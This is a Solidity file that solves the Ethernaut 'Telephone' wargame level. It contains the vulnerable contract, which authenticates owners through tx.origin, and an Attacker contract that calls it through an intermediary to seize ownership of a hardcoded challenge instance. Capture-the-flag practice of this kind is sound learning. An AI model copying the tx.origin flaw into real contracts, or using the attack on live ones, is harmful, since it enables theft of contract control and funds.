// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {
  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Attacker {
  Telephone public vulnerableContract = Telephone(0x22839adf70D06C51FBAC311585b26aaD69cf85c7); // ethernaut vulnerable contract

  function attack() external payable {
    vulnerableContract.changeOwner(msg.sender);
  }
}